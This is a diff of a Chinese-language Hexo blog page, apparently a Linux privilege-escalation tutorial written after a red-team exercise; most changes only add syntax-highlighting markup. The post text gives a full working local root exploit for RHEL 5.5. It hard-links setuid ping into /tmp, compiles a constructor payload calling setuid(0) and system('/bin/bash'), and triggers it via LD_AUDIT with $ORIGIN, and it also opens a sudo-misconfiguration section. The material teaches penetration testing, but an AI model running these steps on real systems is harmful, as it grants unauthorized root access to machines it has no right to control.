@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://klforever.cn/images/5/3.png">
 <meta property="og:image" content="http://klforever.cn/images/5/4.png">
 <meta property="og:image" content="http://klforever.cn/images/5/5.png">
-<meta property="og:updated_time" content="2019-10-11T00:12:59.164Z">
+<meta property="og:updated_time" content="2021-04-25T09:06:22.249Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux提权（二）">
 <meta name="twitter:description" content="Linux提权上一次提权提到了内核漏洞本地提权，SUID提权，但是在面对复杂的服务器环境时需要了解更多的提权方法。上次在ny护网的时候搞到了一台Linux服务器的低权限oracle账号，然后尝试提权成功，所以有了这篇文章。 低内核版本提权发行版本是rhel5.5内核版本是比较低的 2.6.18，但是脏牛漏洞是对内核版本大于2.6.22可以利用，所以我们可以利用tmp目录权限、suid 权限和C语言">
@@ -50,14 +50,15 @@
 
   
     
- 	  <script src="/lib/clickLove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+ 	  <script src="/lib/clickLove.js"></script>
   
   
 
 
   
 
-</head>
+<link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 <body>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
@@ -224,7 +225,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">637字</span>
+      <span class="post-count">631字</span>
     </span>
   </span>
 
@@ -247,39 +248,50 @@
     <h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>上一次提权提到了内核漏洞本地提权，SUID提权，但是在面对复杂的服务器环境时需要了解更多的提权方法。上次在ny护网的时候搞到了一台Linux服务器的低权限oracle账号，然后尝试提权成功，所以有了这篇文章。</p>
 <h2 id="低内核版本提权"><a href="#低内核版本提权" class="headerlink" title="低内核版本提权"></a>低内核版本提权</h2><p>发行版本是rhel5.5内核版本是比较低的 2.6.18，但是脏牛漏洞是对内核版本大于2.6.22可以利用，所以我们可以利用tmp目录权限、suid 权限和C语言使普通帐号提权为ROOT权限。<br><code>tmp目录具有777权限</code></p>
 <p>1.进入tmp目录并创建目录exploit</p>
-<pre><code>cd /tmp
+<pre class="line-numbers language-java"><code class="language-java">cd <span class="token operator">/</span>tmp
 mkdir exploit
-</code></pre><p>2.查看ping命令所具有的权限</p>
-<pre><code>ll /bin/ping
-</code></pre><p>3.创建target文件硬链接</p>
-<pre><code>ln /bin/ping /tmp/exploit/target
-</code></pre><p>4.查看target文件权限</p>
-<pre><code>ll /tmp/exploit/target
-</code></pre><p>5.把target文件加载到内存中</p>
-<pre><code>exec 3&lt; /tmp/exploit/target
-</code></pre><p>6.查看target在内存的状态</p>
-<pre><code>ll /proc/$$/fd/3
-</code></pre><p>7.删除target文件</p>
-<pre><code>rm -rf /tmp/exploit/
-</code></pre><p>8.再次查看target在内存的状态</p>
-<pre><code>ll /proc/$$/fd/3
-</code></pre><p>9.创建一个c语言代码</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>2.查看ping命令所具有的权限</p>
+<pre class="line-numbers language-java"><code class="language-java">ll <span class="token operator">/</span>bin<span class="token operator">/</span>ping
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>3.创建target文件硬链接</p>
+<pre class="line-numbers language-java"><code class="language-java">ln <span class="token operator">/</span>bin<span class="token operator">/</span>ping <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit<span class="token operator">/</span>target
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>4.查看target文件权限</p>
+<pre class="line-numbers language-java"><code class="language-java">ll <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit<span class="token operator">/</span>target
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>5.把target文件加载到内存中</p>
+<pre class="line-numbers language-java"><code class="language-java">exec <span class="token number">3</span><span class="token operator">&lt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit<span class="token operator">/</span>target
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>6.查看target在内存的状态</p>
+<pre class="line-numbers language-java"><code class="language-java">ll <span class="token operator">/</span>proc<span class="token operator">/</span>$$<span class="token operator">/</span>fd<span class="token operator">/</span><span class="token number">3</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>7.删除target文件</p>
+<pre class="line-numbers language-java"><code class="language-java">rm <span class="token operator">-</span>rf <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit<span class="token operator">/</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>8.再次查看target在内存的状态</p>
+<pre class="line-numbers language-java"><code class="language-java">ll <span class="token operator">/</span>proc<span class="token operator">/</span>$$<span class="token operator">/</span>fd<span class="token operator">/</span><span class="token number">3</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>9.创建一个c语言代码</p>
 <p><code>vim payload.c</code></p>
-<pre><code>void __attribute__((constructor)) init()  // 两个下划线
-{
-     setuid(0);
-     system(&quot;/bin/bash&quot;);
-}
-</code></pre><p>10.利用gcc编译这段代码</p>
-<pre><code>gcc -W -fPIC -shared -o /tmp/exploit payload.c
-</code></pre><p>11.提升到root权限</p>
-<pre><code>LD_AUDIT=&quot;\$ORIGIN&quot; exec /proc/self/fd/3
-ERROR: ld.so: object &#39;$ORIGIN&#39; cannot be loaded as audit interface: cannot open shared object file; ignored.
-Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]
-            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]
-            [-M mtu discovery hint] [-S sndbuf]
-            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination
-</code></pre><p><img src="/images/5/1.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 两个下划线</span>
+<span class="token punctuation">{</span>
+     <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+     <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>10.利用gcc编译这段代码</p>
+<pre class="line-numbers language-java"><code class="language-java">gcc <span class="token operator">-</span>W <span class="token operator">-</span>fPIC <span class="token operator">-</span>shared <span class="token operator">-</span>o <span class="token operator">/</span>tmp<span class="token operator">/</span>exploit payload<span class="token punctuation">.</span>c
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>11.提升到root权限</p>
+<pre class="line-numbers language-java"><code class="language-java">LD_AUDIT<span class="token operator">=</span><span class="token string">"\$ORIGIN"</span> exec <span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>fd<span class="token operator">/</span><span class="token number">3</span>
+ERROR<span class="token operator">:</span> ld<span class="token punctuation">.</span>so<span class="token operator">:</span> object <span class="token string">'$ORIGIN'</span> cannot be loaded as audit <span class="token keyword">interface</span><span class="token operator">:</span> cannot open shared object file<span class="token punctuation">;</span> ignored<span class="token punctuation">.</span>
+Usage<span class="token operator">:</span> ping <span class="token punctuation">[</span><span class="token operator">-</span>LRUbdfnqrvVaA<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>c count<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>i interval<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>w deadline<span class="token punctuation">]</span>
+            <span class="token punctuation">[</span><span class="token operator">-</span>p pattern<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>s packetsize<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>t ttl<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>I <span class="token keyword">interface</span> <span class="token class-name">or</span> address<span class="token punctuation">]</span>
+            <span class="token punctuation">[</span><span class="token operator">-</span>M mtu discovery hint<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>S sndbuf<span class="token punctuation">]</span>
+            <span class="token punctuation">[</span> <span class="token operator">-</span>T timestamp option <span class="token punctuation">]</span> <span class="token punctuation">[</span> <span class="token operator">-</span>Q tos <span class="token punctuation">]</span> <span class="token punctuation">[</span>hop1 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span> destination
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/5/1.png" alt></p>
 <p>等到执行完之后就是root权限了。这是一个老版本的gcc编译器漏洞了，虽然老，但是还是学习一下的好。</p>
 <h2 id="sudo配置错误"><a href="#sudo配置错误" class="headerlink" title="sudo配置错误"></a>sudo配置错误</h2><p>这个方法是在freebuf上的一篇文章上看到的，但是实际情况下还没有见到过。</p>
 <p>1.查看 <code>/home/</code>目录下是否有<code>.sudo_as_admin_successful</code>文件，如果有的话直接可以输入当前低权限账号的密码直接<code>sudo su</code>切换为root用户。</p>
